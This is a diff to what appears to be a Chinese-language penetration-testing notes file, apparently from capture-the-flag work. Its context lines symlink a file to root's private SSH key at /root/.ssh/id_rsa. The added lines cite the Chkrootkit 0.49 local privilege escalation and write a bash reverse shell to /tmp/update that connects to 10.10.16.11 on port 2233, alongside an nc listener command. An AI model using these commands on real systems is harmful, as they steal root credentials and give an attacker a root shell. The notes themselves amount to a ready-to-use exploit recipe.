@@ -978,3 +978,11 @@ cd /var/www/html
 touch @xekoner; ln -fs /root/.ssh/id_rsa xekoner
 sudo xxxx   (记得加sudo)
 ```
+
+
+- 调用 rootkit exploit (Chkrootkit 0.49 - Local Privilege Escalation 33899.txt )
+Chkrootkit 0.49 - Local Privilege Escalation        - linux/local/33899.txt
+```bash
+echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.16.11/2233 0>&1' > /tmp/update
+rlwrap -cAr nc -lvvnp 2233
+```
